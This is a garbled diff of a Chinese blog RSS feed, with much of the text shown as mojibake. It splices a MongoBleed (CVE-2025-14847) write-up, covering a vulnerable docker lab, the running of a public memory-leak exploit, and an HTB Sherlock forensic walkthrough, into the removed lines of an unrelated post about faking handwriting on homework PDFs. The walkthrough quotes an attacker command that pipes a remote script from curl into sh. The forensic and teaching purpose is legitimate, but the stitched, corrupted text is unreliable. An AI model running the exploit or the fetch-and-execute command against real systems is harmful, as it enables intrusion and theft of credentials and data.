-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116838-1010417894.png" alt="image-20260102164437061" loading="lazy"></p>
-<p>æ ¹æ®ä¸å¾å¯ä»¥çå°</p>
-<p>2025-12-29 05:25:52</p>
-<h2 id="task5">Task5</h2>
-<p>Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.</p>
-<p>åæ ·å¨ä¸å¾</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117142-1389182106.png" alt="image-20260102165143240" loading="lazy"></p>
-<ul>
-<li><strong>Risk</strong>ï¼é£é©ç­çº§ï¼è¿éæ¯<code>HIGH</code>ï¼è¡¨ç¤ºé«é£é©ï¼</li>
-<li><strong>SourceIP</strong>ï¼æ¥æº IP å°åï¼è¿éæ¯<code>65.0.76.43</code>ï¼</li>
-<li><strong>ConnCount</strong>ï¼è¿æ¥æ¬¡æ°ï¼37630 æ¬¡ï¼ç­æ¶é´åå¤§éè¿æ¥ï¼</li>
-<li><strong>MetaCount</strong>ï¼åæ°æ®æä½æ¬¡æ°ï¼0 æ¬¡ï¼</li>
-<li><strong>DiscCount</strong>ï¼æ­å¼è¿æ¥æ¬¡æ°ï¼37630 æ¬¡ï¼åè¿æ¥æ°ä¸è´ï¼è¯´æè¿æ¥åç«å³æ­å¼ï¼</li>
-<li><strong>MetaRate%</strong>ï¼åæ°æ®æä½å æ¯ï¼0.00%ï¼</li>
-<li><strong>BurstRate/m</strong>ï¼æ¯åéçåè¿æ¥æ°ï¼30104 æ¬¡ï¼ç­æ¶é´åè¿æ¥é¢çæé«ï¼</li>
-<li><strong>First/LastSeen</strong>ï¼é¦æ¬¡ / æåä¸æ¬¡åºç°çæ¶é´ï¼2025-12-29 ç 2 åéåå®æäºå¤§éè¿æ¥ï¼</li>
-</ul>
-<p>æä»¥æ»å±ä¸º75260</p>
-<p>75260</p>
-<h2 id="task6">Task6</h2>
-<p>The attacker gained remote access after a series of bruteâforce attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?</p>
-<p>è®¿é®/var/log/auth.logæ¥å¿</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117520-781480417.png" alt="image-20260102171320748" loading="lazy"></p>
-<p>2025-12-29 05:40:03</p>
-<h2 id="task7">Task7</h2>
-<p>Identify the exact command line the attacker used to execute an inâmemory script as part of their privilegeâescalation attempt.</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117901-872419183.png" alt="image-20260102172751711" loading="lazy"></p>
-<p>ç¡®å®ç¨æ·ä¸ºmongoadmin</p>
-<p><code>uac-mongodbsync-linux-triage\[root]\home\mongoadmin</code>ä¸ç.bash_historyæä»¶ä¸­</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118284-543519413.png" alt="image-20260102172905804" loading="lazy"></p>
-<p><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></p>
-<h2 id="task8">Task8</h2>
-<p>The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118612-1268812667.png" alt="image-20260102173145834" loading="lazy"></p>
-<p>åæ ·å»åæä¸ä¸</p>
-<p>/var/lib/mongodb</p>
-<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152119029-1224398251.png" alt="image-20260102173140081" loading="lazy"></p>
-<p>æç« åé´ï¼</p>
-<p><a href="https://www.cnblogs.com/hzhsec/p/19428472" target="_blank">https://www.cnblogs.com/hzhsec/p/19428472</a></p>
-<p><a href="https://www.gm7.org/archives/16179" target="_blank" rel="noopener nofollow">https://www.gm7.org/archives/16179</a></p>
-<p><strong>åè´£å£°æ</strong></p>
-<p>æ¬ææ¡£<code>MongoDBæ¼æ´å¤ç°ï¼CVE-2025-14847ï¼</code>æåå«çæ¼æ´å¤ç°æ¹æ³ãææ¯ç»èåå©ç¨ä»£ç ï¼<strong>ä»éç¨äºææçå®å¨æµè¯ãæè²å­¦ä¹ ä¸ç ç©¶ç®ç</strong>ã</p>
 
 </div>
 <div class="clear"></div>
 
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-03 15:22">2026-01-03 15:22</span>&nbsp;
-<a href="https://www.cnblogs.com/DSchenzi">dynasty_chenzi</a>&nbsp;
-éè¯»(<span id="post_view_count">4</span>)&nbsp;
+		</div>
+		<div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-03 19:09">2026-01-03 19:08</span>&nbsp;
+<a href="https://www.cnblogs.com/xi-yongqi">æä¼æ¿é£å»</a>&nbsp;
+éè¯»(<span id="post_view_count">0</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(19434377);return false;">æ¶è</a>&nbsp;
-<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19434377', targetLink: 'https://www.cnblogs.com/DSchenzi/p/19434377', title: 'æ·±åº¦åæMangoBleed(CVE-2025-14847)' })">ä¸¾æ¥</a>
+<a href="javascript:void(0)" onclick="AddToWz(19434736);return false;">æ¶è</a>&nbsp;
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19434736', targetLink: 'https://www.cnblogs.com/xi-yongqi/p/19434736', title: 'é¢åå¯¹è±¡ä¸å¤§ç¹ç¹(å°è£ãç»§æ¿ãå¤æ)' })">ä¸¾æ¥</a>
 </div>
-         ]]>
+	 ]]>
     </description>
     </item>
 <item>
@@ -552,7 +346,7 @@ chmod +x mongobleed-detector.sh
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-01-02 20:07">2026-01-02 20:07</span>&nbsp;
 <a href="https://www.cnblogs.com/moonout">MoonOut</a>&nbsp;
-éè¯»(<span id="post_view_count">28</span>)&nbsp;
+éè¯»(<span id="post_view_count">49</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(19432533);return false;">æ¶è</a>&nbsp;
@@ -1739,14 +1533,14 @@ SaaS + ç§æåæå³çï¼</p>
     </description>
     </item>
 <item>
-    <title><![CDATA[ å®ç¨ç¨åºï¼è§£æ¾åæï¼Python æé  PDF æåæ¨¡æå¨ï¼è½»æ¾æå®æåä½ä¸ ]]></title>
-    <link>https://www.cnblogs.com/ChenAI-TGF/p/19430267</link>
-    <guid>3048b8d5024ec9926629b5cf93ef5a31</guid>
+    <title><![CDATA[ æ·±åº¦åæMangoBleed(CVE-2025-14847) ]]></title>
+    <link>https://www.cnblogs.com/DSchenzi/p/19434377</link>
+    <guid>cf48ed95b39651f1399a333f31e72f3f</guid>
     <description>
     <![CDATA[ 
             <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ChenAI-TGF/p/19430267" title="åå¸äº 2026-01-01 15:59">
-    <span role="heading" aria-level="2">å®ç¨ç¨åºï¼è§£æ¾åæï¼Python æé  PDF æåæ¨¡æå¨ï¼è½»æ¾æå®æåä½ä¸</span>
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DSchenzi/p/19434377" title="åå¸äº 2026-01-03 15:22">
+    <span role="heading" aria-level="2">æ·±åº¦åæMangoBleed(CVE-2025-14847)</span>
     
 
 </a>
@@ -1754,197 +1548,377 @@ SaaS + ç§æåæå³çï¼</p>
             </h1>
             <div class="clear"></div>
             <div class="postBody">
-                    <div id="cnblogs_post_description" style="display: none">
-        
-        æ¬æä»ç»äºä¸æ¬¾åºäºPythonå¼åçPDFæåæ¨¡æå·¥å·ï¼å¯èªå¨å°çµå­ææ¬è½¬æ¢ä¸ºé¼çæåææå¹¶å¡«åè³PDFæå®åºåãè¯¥å·¥å·æ¯æä¸­è±æç¬ç«éç½®å­ä½ãå¤§å°ãé¢è²ç­åæ°ï¼éè¿éæºæ°å¨ç®æ³æ¨¡æçå®æåçè¡å¾æãå­ç¬¦åç§»ç­ä¸è§åç¹æ§ãç¨æ·å¯éè¿å¯è§åçé¢æ¡éå¡«ååºåãå®æ¶é¢è§ææå¹¶ä¿å­éç½®æ¨¡æ¿ãææ¯å®ç°éç¨PyMuPDFå¤çPDFæ ¸å¿æä½ï¼ç»åtkinteræå»ºGUIçé¢ï¼Pillowå®ç°å¾åæ¸²æãå¼æºé¡¹ç®å°åå·²æä¾ï¼å¯å¸®å©å­¦çé«æå®ææåä½ä¸éæ±ï¼æ¾èæåå·¥ä½æçã
-    </div>
-<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<h1 id="åè¨">åè¨</h1>
-<p>ä½ä¸ºå­¦çï¼æ³å¿å¤§å®¶é½æè¿è¢«æµ·éæåå®éªæ¥åãè¯¾ç¨ä½ä¸æ¯éççè¦ãè¦è±è´¹å¤§éæ¶é´ä¸ç¬ä¸åå°æåå°çº¸è´¨ææ¡£ä¸­åè¿è¡æ«ææpdfæäº¤ï¼ä¸ä»èæ¶èåï¼æåçå­è¿¹è¿å¯è½åå·®ä¸é½ï¼å½±åä½ä¸ç¾è§åº¦ã</p>
-<p>ä¸ºäºå·æï¼åä¸»å¼åäºä¸æ¬¾åºäºpythonçPDFæåæ¨¡æå¨ï¼å®è½å¤æ¨¡æçå®æåç¬è¿¹ï¼å°çµèä¸çæå­æ¹éå¡«åå° PDF æå®åºåï¼æ¯æä¸­æ/è±æåå¼éç½®ãæåæ°å¨ææèªå®ä¹ãéç½®æ¨¡çå¤ç¨ç­åè½ï¼çæçææé«åº¦è´´è¿çå®æåï¼å¸®ä½ å½»åºåå«æå¨æåçç¦æ¼ãé¦åæ¥ä¸ªçé¢ä»¥åææé¢è§ï¼</p>
-<p><strong>ä»£ç å·²ç»å¼æºå¨Githubï¼<a href="https://github.com/ChenAI-TGF/PDF_HandWrite" target="_blank" rel="noopener nofollow">https://github.com/ChenAI-TGF/PDF_HandWrite</a><br>
-æ¬¢è¿å¤§å®¶ä¸è½½ï¼å¦æè§å¾æç¨çè¯å¯ä»¥ç»æç¹ä¸ªStarï¼ä¸åæè°¢ï¼ï¼<br>
-å¦æç»ä¸ä¸Githubçè¯ä¹æ¬¢è¿ç´æ¥ç§ä¿¡åä¸»è¦ä»£ç </strong></p>
-<p><img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838677-1193143111.png" class="lazyload"></p>
-<h2 id="æµç¨æè·¯æ»è§">æµç¨æè·¯æ»è§</h2>
-<p>è¿æ¬¾ PDF æåæ¨¡æå¨çæ´ä½è¿ä½æµç¨å¯ä»¥åä¸ºãç¨æ·æä½æµç¨ãåãææ¯å®ç°æµç¨ãä¸¤å±ï¼æ¸æ°ææï¼</p>
-<h2 id="1--ç¨æ·æä½æµç¨ç®åæä¸æ">1.  ç¨æ·æä½æµç¨ï¼ç®åæä¸æï¼</h2>
-<ol>
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h1 id="mangobleedcve-2025-14847">MangoBleed(CVE-2025-14847)</h1>
+<p>æ¬æåæäºCVE-2025-14847æ¼æ´åçãæ¼æ´å¤ç°ä»¥åç»åäºHTBé¶åºçSherlockè¿è¡ç»¼ååææ¥å¿ã</p>
+<h2 id="sherlock-scenario">Sherlock Scenario</h2>
+<p>You were contacted early this morning to handle a highâpriority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.</p>
+<p>You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.</p>
+<h2 id="task1">Task1</h2>
+<p>What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?</p>
+<p>ç½ä¸æä¸ä¸ä¹å°±æ¯æè¿çåºæ¥ç</p>
+<p><strong>CVE-2025-14847</strong></p>
+<h3 id="æ¼æ´ç®ä»">æ¼æ´ç®ä»</h3>
+<ul>
 <li>
-<p>æå¼ç®æ  PDFï¼éæ©éè¦å¡«åçå®éªæ¥åãä½ä¸ç­ PDF æä»¶ï¼<br>
-<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838708-921000655.png" class="lazyload"><br>
-<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838676-1025376165.png" class="lazyload"></p>
+<p>ç±»åï¼æ è®¤è¯è¿ç¨å åå­æ³é²</p>
 </li>
 <li>
-<p>æ¡éå¡«ååºåï¼å¨ PDF é¢è§çé¢æå¨é¼ æ ï¼æ¡éåºéè¦æå¥æå­çåºåï¼çº¢è²ç©å½¢æ è®°ï¼ï¼<br>
-<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838596-891684840.png" class="lazyload"></p>
+<p>å±å®³ï¼æ»å»èæ éè®¤è¯å³å¯ä»æå¡å¨åå­ä¸­æåæææ°æ®ï¼å¯è½åæ¬æ°æ®åºå­è¯ãAPIå¯é¥ãä¼è¯ä»¤çãç¨æ·æ°æ®ç­</p>
 </li>
-<li>
-<p>éç½®æååæ°ï¼åå«å¨ä¸­æãè±æ/æ°å­éé¡¹å¡ä¸­è°æ´å­ä½ãå¤§å°ãé¢è²ãæ°å¨ææç­åæ°ï¼<br>
-<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838701-1274364534.png" class="lazyload"></p>
-</li>
-<li>
-<p>è¾å¥å¹¶é¢è§æå­ï¼å¨å³ä¾§ææ¬æ¡è¾å¥éè¦å¡«åçåå®¹ï¼å¼å¯ãå®æ¶é¢è§ãæ¥çæåææï¼<br>
-<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838679-1622199992.png" class="lazyload"><br>
-<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838677-1193143111.png" class="lazyload"></p>
-</li>
-<li>
-<p>ä¸æ»¡æå¯å®æ¶è°æ´åæ°<br>
-<img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838590-1838260486.png" class="lazyload"></p>
-</li>
-<li>
-<p>ç¡®è®¤å¹¶ä¿å­ï¼æææ»¡æåç¡®è®¤åºç¨ç¬è¿¹ï¼æ¯ææ¤éãæ¦é¤éè¯¯åå®¹ï¼ä¹å¯ä¿å­å½åéç½®ä¸ºæ¨¡çï¼æåå¯¼åºå¡«åå®æç PDFã</p>
-</li>
-</ol>
-<p><img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838617-625766259.png" class="lazyload"></p>
-<h3 id="2--ææ¯å®ç°æµç¨åå±åä½">2.  ææ¯å®ç°æµç¨ï¼åå±åä½ï¼</h3>
-<ol>
-<li>UI äº¤äºå±ï¼åºäº tkinter æ­å»ºå¯è§åçé¢ï¼æä¾æé®ãéé¡¹å¡ãææ¬æ¡ç­äº¤äºç»ä»¶ï¼æ¥æ¶ç¨æ·æä½ï¼</li>
-<li>åæ°éç½®å±ï¼ç®¡çä¸­æ/è±ææååæ°ï¼æ¯æéç½®ä¿å­ï¼JSONï¼ä¸å è½½ï¼å®ç°æ¨¡çå¤ç¨ï¼</li>
-<li>PDF æä½å±ï¼åºäº PyMuPDF å®ç° PDF çè¯»åãé¡µé¢æ¸²æãæå­æå¥ãæ¦é¤ãä¿å­ç­æ ¸å¿æä½ï¼</li>
-<li>æåæ¸²æå±ï¼æ ¸å¿é»è¾å±ï¼å®ç°æå­æçãè¯­è¨åºåãæåæ°å¨ææçæï¼æç»å°æ¨¡ææåæå­æå¥ PDFã</li>
-</ol>
-<pre><code class="language-bash">âââââââââââââââââââââââ
-â  UIäº¤äºå±ï¼tkinterï¼ â  # å¯è§åäº¤äºï¼æ¥æ¶æä½
-âââââââââââââââ¬ââââââââ
-              â¼
-âââââââââââââââââââââââ
-â  åæ°éç½®å±ï¼JSONï¼  â  # åæ°ç®¡çï¼æ¨¡çå¤ç¨
-âââââââââââââââ¬ââââââââ
-              â¼
-âââââââââââââââââââââââ
-â PDFæä½å±ï¼PyMuPDFï¼ â  # PDFæ ¸å¿æä½ï¼è¯»å/ä¿å­ç­ï¼
-âââââââââââââââ¬ââââââââ
-              â¼
-âââââââââââââââââââââââ
-â  æåæ¸²æå±ï¼æ ¸å¿ï¼  â  # æåææçæï¼æå­æå¥
-âââââââââââââââââââââââ
-</code></pre>
-<h1 id="æ¶åçå·ä½ææ¯">æ¶åçå·ä½ææ¯</h1>
-<p>è¿æ¬¾å·¥å·åºäº Python çæçå¸¸ç¨åºå¼åï¼ææ¯æ è½»éåä¸å®ç¨æ§å¼ºï¼æ ¸å¿æ¶åä»¥ä¸ææ¯ï¼</p>
-<ol>
-<li><strong>tkinter</strong>ï¼Python åç½® GUI åºï¼æ éé¢å¤å®è£ï¼è´è´£æ­å»ºæ´ä¸ªåºç¨çå¯è§åçé¢ï¼å®ç°æé®ç¹å»ãåæ°è°æ´ãææ¬è¾å¥ãPDF é¢è§ç­äº¤äºåè½ï¼</li>
-<li><strong>PyMuPDFï¼fitzï¼</strong>ï¼æ ¸å¿ PDF å¤çåºï¼æä¾é«æç PDF è¯»åãåå¥ãé¡µé¢æ¸²æãæå­æå¥ãçº¢actæ æ³¨ï¼æ¦é¤åè½ï¼ç­æ¥å£ï¼æ¯å®ç° PDF ç¼è¾çæ ¸å¿ä¾èµï¼</li>
-<li><strong>Pillowï¼PILï¼</strong>ï¼å¾åå¤çåºï¼å° PyMuPDF æ¸²æåºç PDF é¡µé¢åç´ æ°æ®ï¼è½¬æ¢æ tkinter ç»å¸å¯æ¾ç¤ºçå¾åæ ¼å¼ï¼å®ç° PDF é¡µé¢çå¯è§åé¢è§ï¼</li>
-<li><strong>JSON</strong>ï¼è½»éçº§æ°æ®æ ¼å¼ï¼ç¨äºä¿å­ç¨æ·éç½®çæååæ°æ¨¡çï¼å­ä½ãå¤§å°ãæ°å¨å¼ç­ï¼ï¼æ¹ä¾¿åç»­ç´æ¥å¤ç¨ï¼æ ééå¤è°æ´ï¼</li>
-<li><strong>Python éæºæ°ä¸æ°å­¦è®¡ç®</strong>ï¼å®ç°æåææçãä¸è§åæ°å¨ãï¼æ¨¡æçå®æåçä½ç½®åç§»ãå¤§å°æ³¢å¨ãè¡å¾æç­ç¹æ§ï¼</li>
-<li><strong>TTF å­ä½æ¯æ</strong>ï¼è¯»åèªå®ä¹ TrueType å­ä½æä»¶ï¼æ¯æåæ¢ä¸åæåé£æ ¼å­ä½ï¼ééä¸åç¨æ·çæåä¹ æ¯ã</li>
-</ol>
-<h1 id="æç»æææ¼ç¤º">æç»æææ¼ç¤º</h1>
-<p><img alt="å¨è¿éæå¥å¾çæè¿°" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3724025/202601/3724025-20260101155838731-394297387.png" class="lazyload"></p>
-<h1 id="ä»£ç åçç®åè®²è§£æåå­ä½çæ--æ°å¨ææ">ä»£ç åçç®åè®²è§£ï¼æåå­ä½çæ + æ°å¨ææï¼</h1>
-<p>æä»¬éç¹è®²è§£æ ¸å¿åè½ ââ æåå­ä½çæä¸æ°å¨ææçå®ç°ï¼å¿½ç¥ UI æ­å»ºç­è¾å©ä»£ç ï¼èç¦æ ¸å¿é»è¾ï¼</p>
-<h2 id="ä¸-æåå­ä½çææå­æå¥-pdf-æ ¸å¿">ä¸ã æåå­ä½çæï¼æå­æå¥ PDF æ ¸å¿ï¼</h2>
-<p>è¿é¨åçæ ¸å¿æ¯å°æå­æè§åæçåï¼æå¥å° PDF æå®åºåï¼å³é®æ­¥éª¤å¦ä¸ï¼</p>
-<ol>
-<li>
-<p><strong>æå­ä¸åºåé¢å¤ç</strong><br>
-é¦åè·åææ¬æ¡ä¸­çè¾å¥æå­ï¼ææ¢è¡ç¬¦ <code>\n</code> åå²æå¤è¡ï¼åæ¶å°ç¨æ·æ¡éçé¢è§åºååæ ï¼å¸¦ç¼©æ¾æ¯ä¾ï¼è½¬æ¢ä¸º PDF å®éåæ ï¼é¤ä»¥ç¼©æ¾ç³»æ° <code>self.zoom</code>ï¼ï¼å¾å°çå®çå¡«åèå´ <code>(x1, y1, x2, y2)</code>ã</p>
-<pre><code class="language-python"># è¯»åè¾å¥æå­å¹¶åå²è¡
-text = self.text_editor.get("1.0", tk.END).strip("\n")
-lines = text.split('\n')
-# è½¬æ¢ä¸º PDF å®éåæ ï¼å»é¤é¢è§ç¼©æ¾å½±åï¼
-x1, y1 = min(self.start_x, self.end_x)/self.zoom, min(self.start_y, self.end_y)/self.zoom
-x2, y2 = max(self.start_x, self.end_x)/self.zoom, max(self.start_y, self.end_y)/self.zoom
-</code></pre>
-</li>
-<li>
-<p><strong>è¯­è¨åºåä¸åæ°å¹é</strong><br>
-éè¿ <code>is_chinese</code> å½æ°å¤æ­åä¸ªå­ç¬¦æ¯ä¸­æè¿æ¯è±æ/æ°å­ï¼åå«å¹éå¯¹åºçéç½®åæ°ï¼ä¸­æ/è±æç¬ç«çå­ä½ãå¤§å°ãå­è·ç­ï¼ï¼ç¡®ä¿ä¸åè¯­è¨çæåææééåçã</p>
-<pre><code class="language-python"># å¤æ­æ¯å¦ä¸ºä¸­æï¼å«ä¸­ææ ç¹ï¼
-def is_chinese(self, char):
-    if '\u4e00' &lt;= char &lt;= '\u9fff': return True
-    if char in "ãï¼ãï¼ï¼ï¼ï¼ââââï¼ï¼ãããã": return True
-    return False
+</ul>
+<h3 id="æ¼æ´åç">æ¼æ´åç</h3>
+<p>æ ¹æºå¨äºMongoDBçzlibç½ç»æ¶æ¯åç¼©å¤çé»è¾ï¼</p>
+<ul>
+<li>MongoDBæ¯æå®¢æ·ç«¯åéåç¼©æ¶æ¯ã</li>
+<li>æ»å»èåéç¹è´¨ç¸å½¢çåç¼©åï¼å¨æ¶æ¯å¤´ä¸­ææå¶é é¿åº¦å­æ®µä¸ä¸è´</li>
+<li>æå¡å¨å¨è§£åæ¶ä¼åéè¿å¤§ç¼å²åºï¼å¹¶éè¯¯å°å°æªåå§åå°å åå­ä½ä¸ºæææ°æ®è¿åç»æ»å»èã</li>
+<li>æ­¤è¿ç¨å¤æ¬¡åéä¸ååç§»çç¸å½¢è¯·æ±ï¼æ»å»èå¯éæ­¥æååå­ç¢çï¼èååå¯è½æ¢å¤ææä¿¡æ¯ã</li>
+<li>ä¸æ¯ç´æ¥RCEï¼ä½æ³é²çå­è¯å¯å¯¼è´åç»­æ¨ªåç§»å¨ææ°æ®çªåã</li>
+</ul>
+<h3 id="åå½±åçæ¬">åå½±åçæ¬</h3>
+<p>å ä¹ææ2017å¹´ä»¥æ¥å¯ç¨zlibåç¼©çMongoDB Serverçæ¬ï¼åæ¬ä¸»æµåæ¯:</p>
+<ul>
+<li>8.xç³»åï¼è³8.2.2ï¼</li>
+<li>7.0.xã6.0.xã5.0.xã4.4.xç­éççæ¬</li>
+<li>å·ä½ï¼å½±å4.4ã5.0ã6.0ã7.0ã8.0å¨ç³»åï¼ç´å°2025å¹´11æçæ¬ï¼</li>
+</ul>
+<h3 id="ç¯å¢æ­å»º">ç¯å¢æ­å»º</h3>
+<p>1.dockerç¯å¢</p>
+<p>docker-compose.yml</p>
+<pre><code class="language-yml">version: '3.8'
 
-# éåå­ç¬¦æ¶å¹éå¯¹åºè¯­è¨åæ°
-lang = 'zh' if self.is_chinese(char) else 'en'
-p = self.params[lang]  # è·åå¯¹åºè¯­è¨çéç½®åæ°
+services:
+  # åæ¼æ´å½±åççæ¬ï¼å¼å¯ Zlibï¼
+  mongodb-vulnerable:
+    image: mongo:6.0.14
+    container_name: mongodb-vulnerable
+    ports:
+      - "27017:27017"
+    command: mongod --networkMessageCompressors snappy,zlib
+
+  # å·²ä¿®å¤ççæ¬ï¼ç¨äºå¯¹æ¯æµè¯ï¼
+  mongodb-patched:
+    image: mongo:6.0.27
+    container_name: mongodb-patched
+    ports:
+      - "27018:27017"
+    command: mongod --networkMessageCompressors snappy,zlib
+
+volumes:
+  mongodb-data:
+  mongodb-patched-data:
 </code></pre>
-</li>
-<li>
-<p><strong>PDF æå­æå¥æ ¸å¿ API</strong><br>
-ä½¿ç¨ PyMuPDF ç <code>page.insert_text</code> æ¹æ³å®ç°æå­æå¥ï¼è¿æ¯æåå­ä½çæçå³é®ï¼æ ¸å¿åæ°è¯´æå¦ä¸ï¼</p>
-<ul>
-<li><code>fitz.Point(final_x, final_y)</code>ï¼æå­çå®éæå¥åæ ï¼ç»æçåæ°å¨è°æ´åï¼ï¼</li>
-<li><code>char</code>ï¼è¦æå¥çåä¸ªå­ç¬¦ï¼éå­ç¬¦æå¥å®ç°ç²¾ç»æçï¼ï¼</li>
-<li><code>fontsize</code>ï¼å­ç¬¦çå®éå¤§å°ï¼å¸¦å¤§å°æå¨ï¼ï¼</li>
-<li><code>fontfile</code>ï¼TTF æåå­ä½æä»¶è·¯å¾ï¼å³å®å­ä½é£æ ¼ï¼</li>
-<li><code>color</code>ï¼æå­é¢è²ï¼é»è®¤çº¯é»ï¼æ¯æç¨æ·èªå®ä¹ï¼ï¼</li>
-<li><code>morph</code>ï¼åæ¢ç©éµï¼å®ç°å­ç¬¦æè½¬ææï¼å å è¡å¾æä¸å­ç¬¦æè½¬æå¨ï¼ã</li>
-</ul>
-</li>
-<li>
-<p><strong>è¡ä¸å­ç¬¦æç</strong><br>
-æè¡éåæå­ï¼éå­ç¬¦è®¡ç®æå¥åæ ï¼å¤çç©ºæ ¼ï¼åç¬é¢çé´è·ï¼ï¼å½å­ç¬¦æ¨ªåæ è¶åºæ¡éåºåå³ä¾§æ¶èªå¨æ¢è¡ï¼åæ¶æ ¹æ®ãè¡è·åæ°ãè°æ´ä¸ä¸è¡ççºµåæ ï¼ç¡®ä¿æå­æçè§æ´ä¸ä¸è¶åºæ¡éèå´ã</p>
-</li>
-</ol>
-<h2 id="äº-æ°å¨ææå®ç°æ¨¡æçå®æåä¸è§åæ§">äºã æ°å¨ææå®ç°ï¼æ¨¡æçå®æåä¸è§åæ§ï¼</h2>
-<p>è¿æ¯å·¥å·ççµé­æå¨ï¼éè¿ãè¡çº§æ°å¨ãåãå­ç¬¦çº§æ°å¨ãä¸¤å±ææï¼å½»åºæè±æå°ä½çè§æ´æï¼è´´è¿çå®æåï¼å¯¹åºä»£ç ä¸­çéç½®åæ°ï¼</p>
+<p>æåéå</p>
+<pre><code class="language-kotlin">docker-compose up -d
+</code></pre>
+<p>æåå¤±è´¥çå¯ä»¥ä½¿ç¨è¿ä¸ªä»åºçéåæºéç½®å·¥å·:</p>
+<pre><code class="language-kotlin">git clone https://github.com/hzhsec/docker_proxy.git
+chmod +x *.sh
+./docker-proxy.sh
+</code></pre>
+<p>ç­éåæºæ¢å®ï¼åæå</p>
+<pre><code>docker-compose up -d
+</code></pre>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112091-633231826.png" alt="image-20260101223837974" loading="lazy"></p>
+<h3 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h3>
+<pre><code class="language-kotlin">git clone https://github.com/cybertechajju/CVE-2025-14847_Expolit.git
+cd CVE-2025-14847_Expolit
+</code></pre>
+<p>åå»ºèæç¯å¢</p>
+<pre><code class="language-kotlin">python -m venv myenv
+source myenv/bin/activate
+</code></pre>
+<p>å®è£ä¾èµå</p>
+<pre><code class="language-kotlin">pip install -r requirements.txt
+python mongobleed_pro.py -h
+</code></pre>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112673-1527423820.png" alt="image-20260101225522114" loading="lazy"></p>
+<p>ä½¿ç¨æ¬å°ç27017æ¼æ´çæ¬æµè¯</p>
+<pre><code>python mongobleed_pro.py --target http://localhost:27017
+</code></pre>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113009-2057906935.png" alt="image-20260101230632647" loading="lazy"></p>
+<p>æ³é²äºæ°æ®ï¼ä¿å­å¨æ¬å°ç<code>dump_localhost.bin</code>ï¼<code>loot_localhost.txt</code></p>
+<p>åæ¶æµè¯ä¸ä¸<code>27018</code>ç«¯å£</p>
+<p><img src="https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113400-1983221027.png" alt="image-20260101230957937" loading="lazy"></p>
+<p>æ²¡ææ¼æ´</p>
+<h3 id="æ¼æ´åæ">æ¼æ´åæ</h3>
+<p>æä»¬ä»expä¸å»åæä¸ä¸</p>
+<p>ç¬¬ä¸æ­¥ï¼</p>
+<pre><code class="language-python">sock = socket.socket()
+sock.settimeout(3)
+sock.connect((host, port))  # å°è¯è¿æ¥MongoDBé»è®¤ç«¯å£27017
+</code></pre>
+<p>ç¬¬äºæ­¥ï¼</p>
+<p><code>check_vulnerability()</code>æ¼æ´å­å¨æ§æ£æµ</p>
